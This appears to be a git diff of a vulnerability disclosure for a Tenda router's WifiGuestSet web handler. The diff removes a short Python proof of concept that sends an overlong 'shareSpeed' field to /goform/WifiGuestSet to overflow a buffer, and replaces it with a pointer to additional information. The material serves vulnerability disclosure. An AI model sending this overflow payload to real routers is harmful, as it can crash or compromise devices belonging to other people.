@@ -13,14 +13,6 @@ This vulnerability can be attacked through a remote network. The attacker only n
 <img width="720" alt="image" src="https://github.com/DDizzzy79/Tenda-CVE/assets/72267897/42ad9b0e-66b4-4d7c-a363-41ecd44b5bd8">
 
 call chain : WifiGuestSet->fromSetWifiGusetBasic
-# PoC
-```python
-def exploit_WifiGuestSet():
-    url = f"http://{host}/goform/WifiGuestSet"
-    data = {
-        # b"shareSpeed":b'A'*0x800
-        b'shareSpeed':cyclic
-    }
-    res = requests.post(url=url,data=data)
-    print(res.content)
-```
+
+# PoC :
+In Additional information
